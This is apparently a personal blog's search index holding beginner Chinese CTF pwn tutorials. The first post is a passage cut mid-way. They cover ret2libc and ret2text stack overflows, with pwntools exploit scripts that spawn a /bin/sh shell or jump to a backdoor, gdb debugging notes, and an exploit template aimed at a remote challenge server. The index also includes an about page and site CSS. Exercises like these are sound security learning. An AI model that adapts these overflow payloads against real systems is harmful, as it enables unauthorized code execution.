class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p><p>我们用gdb调试一下，验证这段exp是否正确。</p><p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png"></p><p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p><p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png"></p><p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用gdb的动态视角看ret2text的实现</title>
      <link href="/posts/2ee84d32.html"/>
      <url>/posts/2ee84d32.html</url>
      
        <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2text小tips</title>
      <link href="/posts/1111.html"/>
      <url>/posts/1111.html</url>
      
        <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
      
      
      <categories>
          
          <category> pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/%E6%9C%AA%E5%91%BD%E5%90%8D.html"/>
      <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/archive/index.html"/>
      <url>/archive/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>SDUST <strong>大一学生</strong><br>CTFer 主要方向为<strong>pwn</strong></p><hr><h2 id="兴趣爱好"><a href="#兴趣爱好" class="headerlink" title="兴趣爱好"></a>兴趣爱好</h2><p>足球 主队是<strong>山东泰山</strong>和<strong>曼城</strong><br>板绘 爱画一些<strong>二次元妹子</strong>，<del>但实际上是个现充</del><br>在看的书 <strong>《深入理解计算机系统（CSAPP）》</strong></p><hr><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>QQ 1935572185<br>163邮箱 <a href="mailto:&#108;&#122;&#114;&#x32;&#x30;&#48;&#54;&#x31;&#48;&#48;&#56;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">lzr20061008@163.com</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 侧边栏个人信息卡片动态渐变色 */#aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #ff9d60,    #ff83a2,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}/* 侧边栏个人信息卡片动态渐变色 */#aside-content>.card-widget.card-info{    background: linear-gradient(-45deg, rgba(255, 183, 197, 0.8),     rgb(234 138 138 / 80%),     rgb(255 184 184 / 80%),     rgba(255, 219, 111, 0.8));}[data-theme=dark] #aside-content>.card-widget.card-info {    background: linear-gradient(-45deg, rgba(45, 45, 45, 0.8),     rgba(60, 60, 60, 0.8),     rgba(75, 75, 75, 0.8),     rgba(90, 90, 90, 0.8));}/*导航栏居中*/#nav-right{    flex:1 1 auto;    justify-content: flex-end;    margin-left: auto;    display: flex;    flex-wrap:nowrap;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
